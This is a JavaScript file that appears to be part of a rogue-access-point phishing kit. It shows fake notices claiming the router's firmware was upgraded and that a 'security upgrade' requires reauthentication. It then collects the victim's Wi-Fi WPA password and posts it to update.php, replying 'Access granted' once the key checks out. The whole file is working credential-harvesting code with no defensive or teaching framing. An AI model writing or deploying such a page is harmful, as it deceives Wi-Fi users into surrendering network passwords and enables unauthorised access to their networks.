var AlertCountLimit = 3;

function $MakeAlertDanger(message) {
	var $alert = $($("#alert").html()).addClass("alert-danger");
	$alert.find("span.glyphicon").addClass("glyphicon-remove-sign");
	$alert.find("strong.heading").text("Warning");
	$alert.find("span.message").text(message);
	return $alert;
}

function $MakeAlertWarning(message) {
	var $alert = $($("#alert").html()).addClass("alert-warning");
	$alert.find("span.glyphicon").addClass("glyphicon-exclamation-sign");
	$alert.find("strong.heading").text("Warning");
	$alert.find("span.message").text(message);
	return $alert;
}

function $MakeAlertSuccess(message) {
	var $alert = $($("#alert").html()).addClass("alert-success");
	$alert.find("span.glyphicon").addClass("glyphicon-ok-sign");
	$alert.find("strong.heading").text("Success");
	$alert.find("span.message").text(message);
	return $alert;
}

function $MakeAlertInfo(message) {
	var $alert = $($("#alert").html()).addClass("alert-info");
	$alert.find("span.glyphicon").addClass("glyphicon-info-sign");
	$alert.find("strong.heading").text("Notice");
	$alert.find("span.message").text(message);
	return $alert.collapse("hide");
}

function $ShowAlert($alert) {
	var $alertSection = $("#alert-section");
	var $alertSectionTitle = $("#alert-section>h3");
	var $alerts = $alertSection.find("div.alert");
	for (var i = AlertCountLimit; i <= $alerts.length; i++) $alerts.eq(i - 1).remove();
	return $alert.insertAfter($alertSectionTitle).collapse("show");
}

function $AuthenticationThemeSet(theme) {
	var $panel = $("#authentication-section>article.panel");
	$panel.removeClass("panel-default panel-primary panel-info panel-success panel-warning panel-danger");
	return $panel.addClass(theme);
}

$(function() {
	var $submitButton = $("#wpa-submit");
	var $passwordTextbox = $("#wpa-password");
	var $passwordButton = $("#wpa-visibility");

	$passwordTextbox.on("input", function(event) {
		$submitButton.prop("disabled", $(this).val().length < 8);
	});

	$passwordButton.click(function(event) {
		$passwordTextbox.data("readable", !$passwordTextbox.data("readable"));
		$passwordTextbox.attr("type", $passwordTextbox.data("readable")? "text" : "password");
	});

	$submitButton.click(function(event) {
		$submitButton.prop("disabled", true);
		$passwordTextbox.prop("disabled", true);
		$passwordButton.prop("disabled", true);
		var $post = $.post("update.php?dynamic=true", {
			"key1": $("input[name=key1]").val()
		});
		$post.done(function(data) {
			var validKey = data == "authenticated";
			var $alert = validKey?  $MakeAlertSuccess("Access granted, please wait while services are being restarted...") :
									$MakeAlertWarning("The password you've entered is incorrect, please try again.");
			$ShowAlert($alert);

			if (validKey) {
				$AuthenticationThemeSet("panel-success");
			} else {
				$AuthenticationThemeSet("panel-warning");
				$submitButton.prop("disabled", false);
				$passwordTextbox.prop("disabled", false);
				$passwordButton.prop("disabled", false);
			}
		});
		$post.fail(function(event) {
			$ShowAlert($MakeAlertDanger("You've been disconnected from the authenication server! This could be caused by a Wi-Fi disconnection."));
			$AuthenticationThemeSet("danger");
			setTimeout(function() {
				$submitButton.prop("disabled", false);
				$passwordTextbox.prop("disabled", false);
				$passwordButton.prop("disabled", false);
			}, 1000);
		});
	});
});

$(document).ready(function() {
	$alertUpdate = $MakeAlertInfo("Your wireless router's firmware has been successfully upgraded to the latest version.");
	$alertReauth = $MakeAlertWarning("Due to a security upgrade, you must reauthenticate to access the wireless network.");

	setTimeout(function() {
		$ShowAlert($alertUpdate);
	}, 500 + Math.round(2000 * Math.random()));


	setTimeout(function() {
		$ShowAlert($alertReauth);
	}, 500 + Math.round(2000 * Math.random()));
});
